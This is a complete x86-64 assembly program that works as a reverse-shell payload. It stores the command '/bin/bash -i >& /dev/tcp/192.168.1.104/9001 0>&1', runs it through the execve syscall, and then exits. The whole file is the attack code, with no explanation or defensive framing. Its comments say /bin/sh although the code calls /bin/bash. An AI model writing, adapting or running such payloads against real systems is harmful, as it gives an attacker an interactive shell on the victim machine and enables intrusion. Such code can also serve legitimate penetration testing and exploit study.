section .data
binsh db "/bin/bash", 0
arg1 db "-c", 0
command db "/bin/bash -i >& /dev/tcp/192.168.1.104/9001 0>&1", 0
argv dq binsh, arg1, command, 0 
; argv[] = { "/bin/sh", "-c", "command", NULL }
envp dq 0
section .text
global _start
_start:
mov rax, 59 
; execve syscall number
lea rdi, [binsh] 
; rdi = "/bin/sh"
lea rsi, [argv] 
; rsi = argv[]
lea rdx, [envp] 
; rdx = envp[]
syscall 
; execve("/bin/sh", ["sh", "-c", "<command>"], NULL)
mov rax, 60 
; exit syscall number
xor rdi, rdi 
; exit(0)
syscall
